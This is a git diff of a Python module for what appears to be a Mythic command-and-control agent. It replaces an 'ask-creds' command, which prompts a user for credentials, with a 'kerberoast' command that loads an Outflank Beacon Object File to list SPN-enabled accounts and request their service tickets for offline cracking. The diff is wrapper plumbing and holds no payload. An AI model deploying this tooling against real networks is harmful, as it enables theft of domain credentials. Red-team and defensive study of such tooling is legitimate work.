@@ -37,21 +37,33 @@ def SerialiseArgs(OfArgs):
         output_bytes += of_arg.arg_data
     return output_bytes
 
-class AskCredsArguments(TaskArguments):
+class KerberoastArguments(TaskArguments):
     def __init__(self, command_line, **kwargs):
         super().__init__(command_line)
         self.args = [
             CommandParameter(
-                name="reason",
+                name="action",
                 type=ParameterType.String,
-                description="path to change directory to",
+                description="Action to perform [list, list-no-aes, roast, roast-no-aes]",
                 parameter_group_info=[
                     ParameterGroupInfo(
                         ui_position=1,
                         required=True,
                         default_value=""
                         )
-                    ],
+                ],
+            ),
+            CommandParameter(
+                name="user",
+                type=ParameterType.String,
+                description="Optional: the user to roast",
+                parameter_group_info=[
+                    ParameterGroupInfo(
+                        ui_position=2,
+                        required=False,
+                        default_value=""
+                        )
+                ],
             )
         ]
 
@@ -68,11 +80,28 @@ class AskCredsArguments(TaskArguments):
 
     
 
-class AskCredsCommand(CommandBase):
-    cmd = "ask-creds"
+class KerberoastCommand(CommandBase):
+    cmd = "kerberoast"
     needs_admin = False
-    help_cmd = "ask-creds [reason]"
-    description = "Ask for credentials from the user."
+    help_cmd = """
+List SPN enabled accounts:
+    kerberoast list
+
+List SPN enabled accounts without AES Encryption:
+    kerberoast list-no-aes
+
+Roast all SPN enabled accounts:
+    kerberoast roast
+
+Roast all SPN enabled accounts without AES Encryption:
+    kerberoast roast-no-aes
+
+Roast a specific SPN enabled account:
+    kerberoast roast <username>
+
+    
+    """
+    description = "Perform Kerberoasting against all (or specified) SPN enabled accounts."
     version = 1
     script_only = True
     is_exit = False
@@ -82,8 +111,8 @@ class AskCredsCommand(CommandBase):
     is_upload_file = False
     is_remove_file = False
     supported_ui_features = []
-    author = "@checkymander"
-    argument_class = AskCredsArguments
+    author = "Cornelis de Plaa (@Cn33liz)"
+    argument_class = KerberoastArguments
     attackmapping = []
     browser_script = []
     attributes = CommandAttributes(
@@ -99,9 +128,9 @@ class AskCredsCommand(CommandBase):
             raise Exception("BOF's are currently only supported on x64 architectures")
 
 
-        bof_path = f"/Mythic/mythic/agent_functions/outflank_bofs/ask_creds/ask_creds.{arch}.o"
+        bof_path = f"/Mythic/mythic/agent_functions/outflank_bofs/kerberoast/kerberoast.{arch}.o"
         if(os.path.isfile(bof_path) == False):
-            await self.compile_bof("/Mythic/mythic/agent_functions/outflank_bofs/ask_creds/")
+            await self.compile_bof("/Mythic/mythic/agent_functions/outflank_bofs/kerberoast/")
 
         # Read the COFF file from the proper directory
         with open(bof_path, "rb") as coff_file:
@@ -113,21 +142,21 @@ class AskCredsCommand(CommandBase):
                                     file=encoded_file,
                                     delete_after_fetch=True)  
         
-        encoded_args = ""
-        if(task.args.get_arg("reason") == ""):
-            # Initialize our Argument list object
-            OfArgs = []
-            
-            #Pack our argument and add it to the list
-            reason = task.args.get_arg("reason")
+        # Initialize our Argument list object
+        OfArgs = []
+        
+        #Pack our argument and add it to the list
+        action = task.args.get_arg("action")
+        OfArgs.append(generateWString(action))
 
-            #Repeat this for every argument being passed to the COFF (Changing the type as needed)
-            OfArgs.append(generateWString(reason))
+        if(task.args.get_arg("user") != ""):
+            user = task.args.get_arg("user")
+            OfArgs.append(generateWString(user))
 
-            # Serialize our arguments into a single buffer and base64 encode it
-            encoded_args = base64.b64encode(SerialiseArgs(OfArgs)).decode()
+        #Repeat this for every argument being passed to the COFF (Changing the type as needed)
 
-
+        # Serialize our arguments into a single buffer and base64 encode it
+        encoded_args = base64.b64encode(SerialiseArgs(OfArgs)).decode()
 
         # Delegate the execution to the coff command, passing: 
         #   the file_id from our create_file RPC call
